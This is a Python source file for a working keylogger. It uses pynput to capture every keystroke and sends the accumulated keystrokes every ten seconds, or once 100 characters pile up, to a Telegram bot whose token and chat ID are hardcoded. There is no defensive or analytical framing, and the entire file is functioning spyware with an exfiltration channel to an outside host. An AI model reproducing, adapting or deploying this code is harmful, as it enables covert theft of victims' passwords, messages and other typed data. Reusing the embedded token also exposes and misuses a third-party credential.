import requests
from pynput.keyboard import Listener
import threading

bot_token = '7258254881:AAFS2nAFcfRR064s4CipbWXOPGjBk9_eYcE'
chat_id = '1075386465'

log = ""

def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot7258254881:AAFS2nAFcfRR064s4CipbWXOPGjBk9_eYcE/sendMessage"
    params = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print("Veri başarıyla gönderildi.")
    else:
        print(f"Mesaj gönderilemedi: {response.text}")

def on_press(key):
    global log 
    try:
        log += str(key).replace("'", "") 
    except Exception as e:
        log += "[ERROR]"  

    if len(log) > 100:  
        send_message_to_telegram(log)
        log = ""  

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_logs_periodically():
    global log 
    threading.Timer(10, send_logs_periodically).start()  
    if log:
        send_message_to_telegram(log)
        log = ""

if __name__ == "__main__":
    send_logs_periodically() 
    start_keylogger() 
